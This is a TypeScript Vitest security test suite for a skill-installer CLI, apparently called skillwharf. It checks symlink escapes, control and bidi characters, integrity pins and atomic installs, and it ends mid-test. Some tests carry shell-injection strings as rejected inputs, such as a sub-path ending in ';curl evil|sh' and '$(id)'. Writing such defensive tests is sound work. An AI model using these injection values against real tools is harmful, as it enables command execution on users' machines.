import { execFileSync, spawnSync } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { linkStatus } from "./agents.js";
import { copyDir, hashDir } from "./fs.js";
import { findProjectRoot, loadLock, loadManifest, makeContext, storePath, validateManifest } from "./manifest.js";
import { addSkill, doctor, removeSkill, syncSkills, updateSkills } from "./ops.js";
import { loadRegistry } from "./registry.js";
import { isSkillDir, readSkill } from "./skill.js";
import { fetchSource, parseSource } from "./source.js";
import type { Context, Lockfile, Manifest } from "./types.js";
import { scanClaudeUsage } from "./usage.js";

const repo = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");

let base: string, home: string, proj: string, outside: string, ctx: Context;
const savedEnv = { ...process.env };

// Built from code points so the source never holds an invisible or look-alike character.
const RLO = String.fromCodePoint(0x202e); // right-to-left override
const LONG_S = String.fromCodePoint(0x17f); // U+017F
const KELVIN = String.fromCodePoint(0x212a); // U+212A KELVIN SIGN
const FULLWIDTH_G = String.fromCodePoint(0xff47); // U+FF47

function writeSkill(dir: string, name: string, body = "body", description = "d") {
  fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(path.join(dir, "SKILL.md"), `---\nname: ${name}\ndescription: ${description}\n---\n${body}\n`);
}

function writeManifest(m: Manifest) {
  fs.writeFileSync(path.join(proj, "skillwharf.json"), JSON.stringify(m));
}

function writeLock(l: Lockfile) {
  fs.writeFileSync(path.join(proj, "skillwharf.lock.json"), JSON.stringify(l));
}

function read(p: string): string {
  return fs.readFileSync(p, "utf8");
}

/** Run the CLI from source in `cwd` against the throwaway home. */
function cli(args: string[], cwd = proj) {
  const r = spawnSync(process.execPath, [path.join(repo, "node_modules/tsx/dist/cli.mjs"), path.join(repo, "src/cli.ts"), ...args], {
    cwd,
    env: { ...process.env, SKILLWHARF_HOME: home },
    encoding: "utf8",
  });
  return { stdout: r.stdout, stderr: r.stderr, status: r.status };
}

/**
 * A local "GitHub": https://github.com/acme/skills.git is rewritten to a bare
 * repo made from `build(work)`, through git's own insteadOf config. No network.
 */
function localGithub(build: (work: string) => void): void {
  const gh = path.join(base, "gh");
  const work = path.join(base, "work");
  const git = (...args: string[]) =>
    execFileSync("git", ["-c", "user.name=t", "-c", "user.email=t@example.invalid", "-c", "commit.gpgsign=false", ...args], {
      stdio: ["ignore", "pipe", "pipe"],
    })
      .toString()
      .trim();
  git("init", "--quiet", work);
  build(work);
  git("-C", work, "add", "-A");
  git("-C", work, "commit", "--quiet", "-m", "one");
  fs.mkdirSync(path.join(gh, "acme"), { recursive: true });
  git("clone", "--quiet", "--bare", work, path.join(gh, "acme", "skills.git"));
  process.env.GIT_CONFIG_COUNT = "3";
  process.env.GIT_CONFIG_KEY_0 = `url.file://${gh}/.insteadOf`;
  process.env.GIT_CONFIG_VALUE_0 = "https://github.com/";
  process.env.GIT_CONFIG_KEY_1 = "uploadpack.allowAnySHA1InWant";
  process.env.GIT_CONFIG_VALUE_1 = "true";
  process.env.GIT_CONFIG_KEY_2 = "protocol.file.allow";
  process.env.GIT_CONFIG_VALUE_2 = "always";
}

beforeEach(() => {
  base = fs.mkdtempSync(path.join(os.tmpdir(), "skdeck-r4-"));
  home = path.join(base, "home");
  proj = path.join(base, "proj");
  outside = path.join(base, "outside");
  for (const d of [home, proj, outside]) fs.mkdirSync(d, { recursive: true });
  ctx = makeContext({ cwd: proj, home });
});
afterEach(() => {
  for (const k of Object.keys(process.env)) if (k.startsWith("GIT_CONFIG_")) delete process.env[k];
  Object.assign(process.env, savedEnv);
  fs.rmSync(base, { recursive: true, force: true });
});

// ------------------------------------------------------------------ R4-1
describe("R4-1: a symlink inside a GitHub sub-path is never followed", () => {
  beforeEach(() => {
    // The victim: a skill folder outside the fetched repository.
    writeSkill(path.join(outside, "private"), "stolen", "private notes");
    localGithub((work) => {
      writeSkill(path.join(work, "ok"), "ok");
      fs.symlinkSync(outside, path.join(work, "l")); // l -> victim's folder
      fs.symlinkSync(path.join(outside, "private"), path.join(work, "direct")); // last component is the link
    });
    writeManifest({ version: 1, agents: ["claude"], skills: {} });
  });

  it("fetchSource refuses a link in the middle of the sub-path", () => {
    expect(() => fetchSource(parseSource("github:acme/skills/l/private"))).toThrow(/symlink/);
  });

  it("fetchSource refuses a link as the final component", () => {
    expect(() => fetchSource(parseSource("github:acme/skills/direct"))).toThrow(/symlink/);
  });

  it("sync from a manifest with no lock entry copies nothing", () => {
    writeManifest({ version: 1, agents: ["claude"], skills: { x: { source: "github:acme/skills/l/private" } } });
    expect(() => syncSkills(ctx)).toThrow(/symlink/);
    expect(fs.existsSync(storePath(ctx, "x"))).toBe(false);
    expect(fs.existsSync(path.join(proj, ".claude"))).toBe(false);
  });

  it("add copies nothing and records nothing", () => {
    expect(() => addSkill(ctx, "github:acme/skills/l/private")).toThrow(/symlink/);
    expect(fs.existsSync(path.join(proj, ".skillwharf"))).toBe(false);
    expect(fs.existsSync(path.join(proj, ".claude"))).toBe(false);
    expect(Object.keys(loadManifest(ctx)!.skills)).toEqual([]);
  });

  it("still fetches an ordinary sub-path", () => {
    const f = fetchSource(parseSource("github:acme/skills/ok"));
    try {
      expect(isSkillDir(f.dir)).toBe(true);
    } finally {
      f.cleanup();
    }
  });
});

// ------------------------------------------------------------------ R4-2
describe("R4-2: a folder with .git, links or empty directories is never taken for a skillwharf copy", () => {
  let store: string, target: string;

  beforeEach(() => {
    writeSkill(path.join(proj, "src", "s"), "s");
    writeManifest({ version: 1, agents: ["claude"], skills: { s: { source: "path:./src/s" } } });
    syncSkills(ctx);
    store = storePath(ctx, "s");
    target = path.join(proj, ".claude", "skills", "s");
  });

  /**
   * Replace the link with a real folder holding the store's exact bytes plus
   * `extra`, and record in the lock that skillwharf made a copy there (as the
   * copy fallback does), so only what is in the folder can make it foreign.
   */
  function plant(extra: (dir: string) => void, record = true) {
    fs.rmSync(target, { recursive: true, force: true });
    fs.cpSync(store, target, { recursive: true });
    extra(target);
    if (record) {
      const lock = loadLock(ctx);
      lock.skills.s.links = { claude: "copy" };
      writeLock(lock);
    }
  }

  const variants: [string, (dir: string) => void][] = [
    [".git directory", (d) => { fs.mkdirSync(path.join(d, ".git")); fs.writeFileSync(path.join(d, ".git", "HEAD"), "ref: refs/heads/main\n"); }],
    ["symlink", (d) => fs.symlinkSync(path.join(outside), path.join(d, "link"))],
    ["empty directory", (d) => fs.mkdirSync(path.join(d, "empty"))],
    ...(process.platform === "win32"
      ? []
      : ([["named pipe", (d: string) => execFileSync("mkfifo", [path.join(d, "pipe")])]] as [string, (dir: string) => void][])),
  ];

  it("a plain byte-identical copy the lock records is recognised as ours (control)", () => {
    plant(() => {});
    expect(linkStatus(ctx, loadManifest(ctx)!, "claude", "s", store, { copyRecorded: true })).toBe("stale-copy");
  });

  it("the same bytes with no record in the lock are foreign (identical to the store is not proof)", () => {
    plant(() => {}, false);
    expect(linkStatus(ctx, loadManifest(ctx)!, "claude", "s", store)).toBe("foreign");
    expect(() => syncSkills(ctx)).toThrow(/not managed/);
    removeSkill(ctx, "s");
    expect(fs.existsSync(target)).toBe(true);
  });

  it("remove still deletes a genuine skillwharf copy, as the Windows fallback leaves one", () => {
    plant(() => {});
    const r = removeSkill(ctx, "s");
    expect(r.removedLinks).toEqual(["claude"]);
    expect(fs.existsSync(target)).toBe(false);
    expect(fs.existsSync(store)).toBe(false);
  });

  describe.each(variants)("with a %s in the agent folder", (_label, extra) => {
    beforeEach(() => plant(extra));
    const intact = () => {
      expect(fs.lstatSync(target).isDirectory()).toBe(true);
      expect(fs.readdirSync(target).length).toBeGreaterThan(1); // SKILL.md plus the extra entry
    };

    it("add refuses without --force and leaves it intact", () => {
      expect(() => addSkill(ctx, path.join(proj, "src", "s"))).toThrow(/not managed/);
      intact();
    });

    it("sync refuses without --force and leaves it intact", () => {
      expect(() => syncSkills(ctx)).toThrow(/not managed/);
      intact();
    });

    it("remove does not delete it", () => {
      removeSkill(ctx, "s");
      intact();
    });

    it("doctor calls it foreign, not a stale copy", () => {
      const msgs = doctor(ctx).map((i) => i.message);
      expect(msgs.some((m) => /not managed by skillwharf/.test(m))).toBe(true);
      expect(msgs.some((m) => /is a copy/.test(m))).toBe(false);
    });
  });
});

// ------------------------------------------------------------------ R4-3
describe("R4-3: agentPaths targets are validated and printed sanitised", () => {
  const m = (p: { projectPath?: string; globalPath?: string }): Manifest =>
    ({ version: 1, agents: ["claude"], skills: {}, agentPaths: { claude: p } }) as Manifest;

  it.each(["\u001b]52;c;x\u0007", "ok/\u009b31m", `a/${RLO}b`, "a\nb"])("refuses projectPath %j", (p) => {
    expect(() => validateManifest(m({ projectPath: p }), "skillwharf.json")).toThrow(/control/);
  });

  it("refuses a globalPath with a control character", () => {
    expect(() => validateManifest(m({ globalPath: "x/\u001b[2J" }), "skillwharf.json")).toThrow(/control/);
  });

  it("`where` prints no bidi override even when the project folder name has one", () => {
    const odd = path.join(base, `p${RLO}x`);
    fs.mkdirSync(odd);
    const oddCtx = makeContext({ cwd: odd, home });
    writeSkill(path.join(odd, "src", "s"), "s");
    fs.writeFileSync(path.join(odd, "skillwharf.json"), JSON.stringify({ version: 1, agents: ["claude"], skills: {} }));
    addSkill(oddCtx, path.join(odd, "src", "s"));
    const r = cli(["where", "s"], odd);
    expect(r.status).toBe(0);
    expect(r.stdout).toContain(".claude");
    expect(r.stdout).not.toContain(RLO);
  });
});

// ------------------------------------------------------------------ R4-4
describe("R4-4: --json output is sanitised and registry entries keep only known fields", () => {
  const unsafe = new RegExp("[\\u0080-\\u009f\\u202a-\\u202e\\u2066-\\u2069]");

  it("list --json drops C1 and bidi characters from a SKILL.md description", () => {
    writeManifest({ version: 1, agents: ["claude"], skills: {} });
    // YAML escapes, so the file itself is ASCII and the parsed string holds the real characters.
    writeSkill(path.join(proj, "src", "s"), "s", "body", `"safe\\u202Etxt\\u009Bred"`);
    addSkill(ctx, path.join(proj, "src", "s"));
    expect(readSkill(storePath(ctx, "s")).description).toMatch(unsafe); // the fixture really carries them
    const r = cli(["list", "--json"]);
    expect(r.status).toBe(0);
    expect(r.stdout).toContain("safetxtred");
    expect(r.stdout).not.toMatch(unsafe);
  });

  it("usage --json drops them from skill names and project paths taken from session logs", () => {
    writeManifest({ version: 1, agents: ["claude"], skills: {} });
    const logs = path.join(home, ".claude", "projects", "p");
    fs.mkdirSync(logs, { recursive: true });
    const line = {
      timestamp: new Date().toISOString(),
      cwd: `${fs.realpathSync(proj)}/x${RLO}y`, // the CLI sees the resolved path (/var -> /private/var on macOS)
      message: { content: [{ type: "tool_use", name: "Skill", input: { skill: `ev${RLO}il\u009b` } }] },
    };
    fs.writeFileSync(path.join(logs, "s.jsonl"), JSON.stringify(line) + "\n");
    const r = cli(["usage", "--json"]);
    expect(r.status).toBe(0);
    expect(r.stdout).toContain("evil");
    expect(r.stdout).not.toMatch(unsafe);
  });

  it("search --json emits a registry entry without the fields it does not know", async () => {
    const reg = path.join(base, "reg");
    fs.mkdirSync(reg);
    fs.writeFileSync(
      path.join(reg, "index.json"),
      JSON.stringify({
        version: 1,
        skills: [{ name: "pdf", description: "pdf tools", source: "github:o/r/pdf", extra: `x${RLO}y`, nested: { a: 1 } }],
      }),
    );
    const idx = await loadRegistry(reg);
    expect(idx.skills[0]).not.toHaveProperty("extra");
    expect(idx.skills[0]).not.toHaveProperty("nested");
    const r = cli(["search", "pdf", "--registry", reg, "--json"]);
    expect(r.status).toBe(0);
    expect(r.stdout).toContain('"pdf"');
    expect(r.stdout).not.toContain("extra");
    expect(r.stdout).not.toMatch(unsafe);
  });
});

// ------------------------------------------------------------------ R4-5
describe("R4-5: add --all validates every skill before it writes the first one", () => {
  it("a bad second skill leaves nothing installed and nothing linked", () => {
    writeManifest({ version: 1, agents: ["claude"], skills: {} });
    writeSkill(path.join(proj, "multi", "a"), "a");
    writeSkill(path.join(proj, "multi", "b"), '"!!!"');
    expect(() => addSkill(ctx, path.join(proj, "multi"), { all: true })).toThrow(/valid skill name/);
    // Nothing is written before the whole plan passes.
    expect(Object.keys(loadManifest(ctx)!.skills)).toEqual([]);
    expect(Object.keys(loadLock(ctx).skills)).toEqual([]);
    expect(fs.existsSync(storePath(ctx, "a"))).toBe(false);
    expect(fs.existsSync(path.join(proj, ".skillwharf"))).toBe(false);
    expect(fs.existsSync(path.join(proj, ".claude"))).toBe(false);
  });

  it("a foreign folder at the second skill's target stops the whole run before the first write", () => {
    writeManifest({ version: 1, agents: ["claude"], skills: {} });
    writeSkill(path.join(proj, "multi", "a"), "a");
    writeSkill(path.join(proj, "multi", "b"), "b");
    fs.mkdirSync(path.join(proj, ".claude", "skills", "b"), { recursive: true });
    fs.writeFileSync(path.join(proj, ".claude", "skills", "b", "mine.txt"), "mine");
    expect(() => addSkill(ctx, path.join(proj, "multi"), { all: true })).toThrow(/not managed/);
    expect(fs.existsSync(path.join(proj, ".claude", "skills", "a"))).toBe(false);
    expect(fs.existsSync(storePath(ctx, "a"))).toBe(false);
    expect(Object.keys(loadManifest(ctx)!.skills)).toEqual([]);
    expect(read(path.join(proj, ".claude", "skills", "b", "mine.txt"))).toBe("mine");
  });
});

// ------------------------------------------------------------------ R4-6
describe("R4-6: re-adding a skill checks the agents it will link and keeps its agent list", () => {
  it("re-add without --agents keeps the per-skill list and does not touch another agent's folder", () => {
    writeManifest({ version: 1, agents: ["claude", "agents"], skills: {} });
    writeSkill(path.join(proj, "src", "s"), "s", "v1");
    addSkill(ctx, path.join(proj, "src", "s"), { agents: ["claude"] });
    const lockBefore = loadLock(ctx).skills.s.integrity;
    // someone else's folder at a target the skill was never linked into
    fs.mkdirSync(path.join(proj, ".agents", "skills", "s"), { recursive: true });
    fs.writeFileSync(path.join(proj, ".agents", "skills", "s", "mine.txt"), "mine");
    writeSkill(path.join(proj, "src", "s"), "s", "v2");

    expect(() => addSkill(ctx, path.join(proj, "src", "s"))).not.toThrow();
    expect(loadManifest(ctx)!.skills.s.agents).toEqual(["claude"]);
    expect(read(path.join(proj, ".agents", "skills", "s", "mine.txt"))).toBe("mine");
    expect(loadLock(ctx).skills.s.integrity).toBe(hashDir(storePath(ctx, "s")));
    expect(loadLock(ctx).skills.s.integrity).not.toBe(lockBefore);
  });

  it("a foreign folder at a target named with --agents stops the run before the store is replaced", () => {
    writeManifest({ version: 1, agents: ["claude"], skills: {} });
    writeSkill(path.join(proj, "src", "s"), "s", "v1");
    addSkill(ctx, path.join(proj, "src", "s"));
    const storeHash = hashDir(storePath(ctx, "s"));
    const lockText = read(path.join(proj, "skillwharf.lock.json"));
    const manifestText = read(path.join(proj, "skillwharf.json"));
    fs.mkdirSync(path.join(proj, ".agents", "skills", "s"), { recursive: true });
    fs.writeFileSync(path.join(proj, ".agents", "skills", "s", "mine.txt"), "mine");
    writeSkill(path.join(proj, "src", "s"), "s", "v2");

    expect(() => addSkill(ctx, path.join(proj, "src", "s"), { agents: ["claude", "agents"] })).toThrow(/\.agents[/\\]skills[/\\]s/);
    expect(hashDir(storePath(ctx, "s"))).toBe(storeHash);
    expect(read(path.join(proj, "skillwharf.lock.json"))).toBe(lockText);
    expect(read(path.join(proj, "skillwharf.json"))).toBe(manifestText);
    expect(read(path.join(proj, ".agents", "skills", "s", "mine.txt"))).toBe("mine");
  });
});

// ------------------------------------------------------------------ R4-7
describe("R4-7: a symlinked SKILL.md is not a skill", () => {
  beforeEach(() => {
    fs.writeFileSync(path.join(outside, "hosts"), "---\nname: stolen\nversion: 9.9\n---\nlocal file\n");
    fs.mkdirSync(path.join(proj, "src", "s"), { recursive: true });
    fs.symlinkSync(path.join(outside, "hosts"), path.join(proj, "src", "s", "SKILL.md"));
    writeManifest({ version: 1, agents: ["claude"], skills: {} });
  });

  it("isSkillDir says no and readSkill refuses", () => {
    expect(isSkillDir(path.join(proj, "src", "s"))).toBe(false);
    expect(() => readSkill(path.join(proj, "src", "s"))).toThrow(/No SKILL\.md/);
  });

  it("add finds no skill and installs nothing", () => {
    expect(() => addSkill(ctx, path.join(proj, "src", "s"))).toThrow(/No SKILL\.md/);
    expect(fs.existsSync(path.join(proj, ".skillwharf"))).toBe(false);
  });
});

// ------------------------------------------------------------------ R4-8
describe("R4-8: sub-paths are limited to [A-Za-z0-9._-] components", () => {
  it.each(["github:o/r/x;curl evil|sh", "github:o/r/a b", "github:o/r/$(id)", "github:o/r/a`b`", "github:o/r/a&b", "github:o/r/ü"])(
    "parseSource refuses %s",
    (s) => {
      expect(() => parseSource(s)).toThrow(/sub-path/);
    },
  );

  it("parseSource refuses them in a GitHub URL too", () => {
    expect(() => parseSource("https://github.com/o/r/tree/main/a;b")).toThrow(/sub-path/);
  });

  it("still accepts ordinary sub-paths", () => {
    expect(parseSource("github:o/r/skills/pdf-tools_v1.2@main")).toMatchObject({ subpath: "skills/pdf-tools_v1.2" });
  });

  it("a registry drops an entry whose source carries shell metacharacters and keeps the rest", async () => {
    const reg = path.join(base, "reg");
    fs.mkdirSync(reg);
    const e = (name: string, source: string) => ({ name, description: "d", source });
    fs.writeFileSync(
      path.join(reg, "index.json"),
      JSON.stringify({ version: 1, skills: [e("evil", "github:o/r/x;curl evil|sh"), e("good", "github:o/r/good")] }),
    );
    const idx = await loadRegistry(reg);
    expect(idx.skills.map((s) => s.name)).toEqual(["good"]);
  });

  it("a manifest source with a metacharacter is refused when the manifest is used", () => {
    writeManifest({ version: 1, agents: ["claude"], skills: { x: { source: "github:o/r/a;b" } } });
    expect(() => syncSkills(ctx)).toThrow(/sub-path/);
  });
});

// ------------------------------------------------------------------ R4-9
describe("R4-9: a lock entry without integrity is not silently accepted", () => {
  const entry = () => ({
    source: "path:./src/s",
    resolved: `path:${path.join(proj, "src", "s")}`,
    installedAt: "x",
  });

  beforeEach(() => {
    writeSkill(path.join(proj, "src", "s"), "s");
    writeManifest({ version: 1, agents: ["claude"], skills: { s: { source: "path:./src/s" } } });
    writeLock({ version: 1, skills: { s: entry() as never } });
  });

  it("sync refuses, names the entry and leaves the lockfile and store alone", () => {
    const before = read(path.join(proj, "skillwharf.lock.json"));
    expect(() => syncSkills(ctx)).toThrow(/"s".*integrity|integrity.*"s"/);
    expect(read(path.join(proj, "skillwharf.lock.json"))).toBe(before);
    expect(fs.existsSync(storePath(ctx, "s"))).toBe(false);
    expect(fs.existsSync(path.join(proj, ".claude"))).toBe(false);
  });

  it("sync --allow-unpinned installs and writes the missing integrity", () => {
    syncSkills(ctx, { allowUnpinned: true });
    expect(loadLock(ctx).skills.s.integrity).toBe(hashDir(storePath(ctx, "s")));
  });

  it("update regenerates the integrity", () => {
    updateSkills(ctx, ["s"]);
    expect(loadLock(ctx).skills.s.integrity).toBe(hashDir(storePath(ctx, "s")));
  });

  it("doctor says the entry has no integrity", () => {
    syncSkills(ctx, { allowUnpinned: true });
    const lock = loadLock(ctx);
    delete (lock.skills.s as { integrity?: string }).integrity;
    writeLock(lock);
    expect(doctor(ctx).some((i) => /no integrity/.test(i.message))).toBe(true);
  });
});

// ------------------------------------------------------------------ R4-10
describe("R4-10: a skill folder over the size cap is refused before anything lands in the store", () => {
  function expectUntouched() {
    expect(fs.existsSync(path.join(proj, ".skillwharf"))).toBe(false);
    expect(fs.existsSync(path.join(proj, ".claude"))).toBe(false);
    expect(Object.keys(loadManifest(ctx)!.skills)).toEqual([]);
  }

  beforeEach(() => writeManifest({ version: 1, agents: ["claude"], skills: {} }));

  it("refuses more than 2000 files by default", () => {
    const dir = path.join(proj, "src", "big");
    writeSkill(dir, "big");
    for (let i = 0; i < 2001; i++) fs.writeFileSync(path.join(dir, `f${i}.txt`), "x");
    expect(() => addSkill(ctx, dir)).toThrow(/2000 files|--max-skill-files/);
    expectUntouched();
  });

  it("refuses more bytes than the configured cap", () => {
    const dir = path.join(proj, "src", "fat");
    writeSkill(dir, "fat");
    fs.writeFileSync(path.join(dir, "blob.bin"), Buffer.alloc(4096));
    expect(() => addSkill(ctx, dir, { limits: { maxBytes: 1024 } })).toThrow(/--max-skill-size/);
    expectUntouched();
  });

  it("accepts it when the cap is raised", () => {
    const dir = path.join(proj, "src", "fat");
    writeSkill(dir, "fat");
    fs.writeFileSync(path.join(dir, "blob.bin"), Buffer.alloc(4096));
    expect(addSkill(ctx, dir, { limits: { maxBytes: 1024 * 1024 } })).toHaveLength(1);
  });

  it("update refuses an oversized source and leaves the installed store as it was", () => {
    const dir = path.join(proj, "src", "s");
    writeSkill(dir, "s");
    addSkill(ctx, dir);
    const before = hashDir(storePath(ctx, "s"));
    fs.writeFileSync(path.join(dir, "blob.bin"), Buffer.alloc(4096));
    expect(() => updateSkills(ctx, ["s"], { limits: { maxBytes: 1024 } })).toThrow(/--max-skill-size/);
    expect(hashDir(storePath(ctx, "s"))).toBe(before);
  });
});

// ------------------------------------------------------------------ R4-12
describe("R4-12: reserved directory names are compared after Unicode folding", () => {
  const m = (p: string): Manifest => ({ version: 1, agents: ["claude"], skills: {}, agentPaths: { claude: { projectPath: p } } }) as Manifest;

  // U+017F long s, U+212A Kelvin sign, U+FF47 fullwidth g. Lower-casing alone
  // already maps the Kelvin sign to "k", so that one is a control; the other two
  // need the NFKC fold.
  it.each([`.${LONG_S}killwharf/skills`, `.s${KELVIN}illwharf/skills`, `.${FULLWIDTH_G}it/hooks`])("rejects %j", (p) => {
    expect(() => validateManifest(m(p), "skillwharf.json")).toThrow(/agentPaths/);
  });

  it("the Kelvin case really holds U+212A and not an ASCII k", () => {
    const p = `.s${KELVIN}illwharf/skills`;
    expect(p.codePointAt(2)).toBe(0x212a);
    expect(p).not.toBe(".skillwharf/skills");
  });
});

// ================================================================== Round 5
// ------------------------------------------------------------------ C1
describe("R5-C1: sync is all-or-nothing: every skill is fetched and checked before any is installed", () => {
  let lockText: string;

  function expectNothingWritten() {
    expect(fs.existsSync(storePath(ctx, "a"))).toBe(false);
    expect(fs.existsSync(storePath(ctx, "b"))).toBe(false);
    expect(fs.existsSync(path.join(proj, ".claude"))).toBe(false);
    expect(read(path.join(proj, "skillwharf.lock.json"))).toBe(lockText);
  }

  function entryFor(name: string, integrity: string) {
    return {
      source: `path:./src/${name}`,
      resolved: `path:${path.join(proj, "src", name)}`,
      integrity,
      installedAt: "x",
    };
  }

  /** Run `fn` with the temp directory pointed at an empty folder, and return what was left in it. */
  function leftoverTemp(fn: () => void): string[] {
    const tmp = path.join(base, "tmp");
    fs.mkdirSync(tmp);
    const old = process.env.TMPDIR;
    process.env.TMPDIR = tmp;
    try {
      fn();
    } finally {
      if (old === undefined) delete process.env.TMPDIR;
      else process.env.TMPDIR = old;
    }
    return fs.readdirSync(tmp);
  }

  describe("a hash mismatch on the second skill", () => {
    beforeEach(() => {
      writeSkill(path.join(proj, "src", "a"), "a");
      writeSkill(path.join(proj, "src", "b"), "b");
      writeManifest({
        version: 1,
        agents: ["claude"],
        skills: { a: { source: "path:./src/a" }, b: { source: "path:./src/b" } },
      });
      writeLock({
        version: 1,
        skills: {
          a: entryFor("a", hashDir(path.join(proj, "src", "a"))),
          b: entryFor("b", "sha256-not-the-real-hash"),
        },
      });
      lockText = read(path.join(proj, "skillwharf.lock.json"));
    });

    it("installs neither skill, links neither, and leaves the lockfile byte for byte", () => {
      expect(() => syncSkills(ctx)).toThrow(/integrity mismatch for "b"/);
      expectNothingWritten();
    });

    it("leaves no temp folder behind", () => {
      const left = leftoverTemp(() => expect(() => syncSkills(ctx)).toThrow(/integrity mismatch/));
      expect(left).toEqual([]);
    });

    it("installs both when the hashes are right (control)", () => {
      writeLock({
        version: 1,
        skills: {
          a: entryFor("a", hashDir(path.join(proj, "src", "a"))),
          b: entryFor("b", hashDir(path.join(proj, "src", "b"))),
        },
      });
      const left = leftoverTemp(() => {
        expect(syncSkills(ctx).fetched).toEqual(["a", "b"]);
      });
      expect(left).toEqual([]);
      expect(fs.existsSync(path.join(proj, ".claude", "skills", "a"))).toBe(true);
      expect(fs.existsSync(path.join(proj, ".claude", "skills", "b"))).toBe(true);
    });
  });

  describe("an unfetchable pin on the second skill", () => {
    beforeEach(() => {
      localGithub((work) => writeSkill(path.join(work, "b"), "b"));
      writeSkill(path.join(proj, "src", "a"), "a");
      writeManifest({
        version: 1,
        agents: ["claude"],
        skills: { a: { source: "path:./src/a" }, b: { source: "github:acme/skills/b" } },
      });
      writeLock({
        version: 1,
        skills: {
          a: entryFor("a", hashDir(path.join(proj, "src", "a"))),
          b: {
            source: "github:acme/skills/b",
            resolved: "github:acme/skills/b@0123456789abcdef0123456789abcdef01234567",
            integrity: "sha256-x",
            installedAt: "x",
          },
        },
      });
      lockText = read(path.join(proj, "skillwharf.lock.json"));
    });

    it("installs neither skill and leaves the lockfile byte for byte", () => {
      const left = leftoverTemp(() => expect(() => syncSkills(ctx)).toThrow(/Cannot install the pinned commit for "b"/));
      expectNothingWritten();
      expect(left).toEqual([]);
    });
  });
});

// ------------------------------------------------------------------ B1
describe("R5-B1: add --all never records a folder whose source would not parse again", () => {
  beforeEach(() => {
    localGithub((work) => {
      writeSkill(path.join(work, "skills", "ok"), "ok");
      writeSkill(path.join(work, "skills", "bad name"), "bad-name");
      writeSkill(path.join(work, "skills", "x@y"), "x-y");
    });
    writeManifest({ version: 1, agents: ["claude"], skills: {} });
  });

  it("installs the good folder, reports the others as skipped with a reason, and the manifest re-parses", () => {
    const skipped: { dir: string; reason: string }[] = [];
    const added = addSkill(ctx, "github:acme/skills/skills", { all: true, onSkipped: (s) => skipped.push(s) });
    expect(added.map((a) => a.name)).toEqual(["ok"]);
    expect(skipped.map((s) => s.dir).sort()).toEqual(["skills/bad name", "skills/x@y"]);
    for (const s of skipped) expect(s.reason).toMatch(/sub-path/i);

    const m = loadManifest(ctx)!;
    expect(Object.keys(m.skills)).toEqual(["ok"]);
    expect(parseSource(m.skills.ok.source)).toMatchObject({ subpath: "skills/ok", ref: undefined });
    expect(Object.keys(loadLock(ctx).skills)).toEqual(["ok"]);

    // and a later sync can read it
    fs.rmSync(path.join(proj, ".skillwharf"), { recursive: true });
    fs.rmSync(path.join(proj, ".claude"), { recursive: true });
    expect(syncSkills(ctx).fetched).toEqual(["ok"]);
  });

  it("refuses the run when every folder is skipped", () => {
    // rebuild the local "GitHub" without the good folder
    fs.rmSync(path.join(base, "gh"), { recursive: true });
    fs.rmSync(path.join(base, "work"), { recursive: true });
    localGithub((work) => {
      writeSkill(path.join(work, "skills", "bad name"), "bad-name");
      writeSkill(path.join(work, "skills", "x@y"), "x-y");
    });
    expect(() => addSkill(ctx, "github:acme/skills/skills", { all: true })).toThrow(/no installable skill|skipped/i);
    expect(Object.keys(loadManifest(ctx)!.skills)).toEqual([]);
    expect(fs.existsSync(path.join(proj, ".skillwharf"))).toBe(false);
  });
});

// ------------------------------------------------------------------ doctor wording
describe("R5-doctor: the missing-integrity warning says where sync refuses it", () => {
  it("says the folder is installed but unpinned here and that a fresh clone is refused", () => {
    writeSkill(path.join(proj, "src", "s"), "s");
    writeManifest({ version: 1, agents: ["claude"], skills: { s: { source: "path:./src/s" } } });
    writeLock({
      version: 1,
      skills: { s: { source: "path:./src/s", resolved: `path:${path.join(proj, "src", "s")}`, installedAt: "x" } as never },
    });
    syncSkills(ctx, { allowUnpinned: true });
    const lock = loadLock(ctx);
    delete (lock.skills.s as { integrity?: string }).integrity;
    writeLock(lock);
    const msg = doctor(ctx).find((i) => /no integrity/.test(i.message))?.message ?? "";
    expect(msg).toMatch(/installed but unpinned/);
    expect(msg).toMatch(/fresh clone/);
    expect(msg).not.toMatch(/sync will refuse it\)$/);
  });
});

// ------------------------------------------------------------------ path portability
describe("R5-path: a path: source inside the project is recorded relative to it", () => {
  it("add records path:./skills/x and a copy of the project elsewhere can sync it", () => {
    writeManifest({ version: 1, agents: ["claude"], skills: {} });
    writeSkill(path.join(proj, "skills", "x"), "x");
    addSkill(ctx, path.join(proj, "skills", "x"));
    expect(loadManifest(ctx)!.skills.x.source).toBe("path:./skills/x");
    expect(loadLock(ctx).skills.x.source).toBe("path:./skills/x");
    expect(loadLock(ctx).skills.x.resolved).toBe("path:./skills/x");

    // a teammate's checkout: the committed files only, at another location
    const other = path.join(base, "elsewhere", "clone");
    fs.mkdirSync(other, { recursive: true });
    for (const f of ["skillwharf.json", "skillwharf.lock.json"]) fs.copyFileSync(path.join(proj, f), path.join(other, f));
    fs.cpSync(path.join(proj, "skills"), path.join(other, "skills"), { recursive: true });
    const otherCtx = makeContext({ cwd: other, home });
    expect(syncSkills(otherCtx).fetched).toEqual(["x"]);
    expect(fs.existsSync(path.join(other, ".claude", "skills", "x", "SKILL.md"))).toBe(true);
  });

  it("a relative path typed from a sub-folder is recorded relative to the project root too", () => {
    writeManifest({ version: 1, agents: ["claude"], skills: {} });
    writeSkill(path.join(proj, "skills", "x"), "x");
    const prev = process.cwd();
    process.chdir(path.join(proj, "skills"));
    try {
      addSkill(ctx, "./x");
    } finally {
      process.chdir(prev);
    }
    expect(loadManifest(ctx)!.skills.x.source).toBe("path:./skills/x");
  });

  it("add --all from a folder inside the project records each skill relative", () => {
    writeManifest({ version: 1, agents: ["claude"], skills: {} });
    writeSkill(path.join(proj, "multi", "a"), "a");
    writeSkill(path.join(proj, "multi", "b"), "b");
    addSkill(ctx, path.join(proj, "multi"), { all: true });
    const m = loadManifest(ctx)!;
    expect(m.skills.a.source).toBe("path:./multi/a");
    expect(m.skills.b.source).toBe("path:./multi/b");
    expect(loadLock(ctx).skills.a.resolved).toBe("path:./multi/a");
  });

  it("a folder outside the project stays absolute, and sync elsewhere refuses it without the flag", () => {
    writeManifest({ version: 1, agents: ["claude"], skills: {} });
    writeSkill(path.join(outside, "shared"), "shared");
    addSkill(ctx, path.join(outside, "shared"));
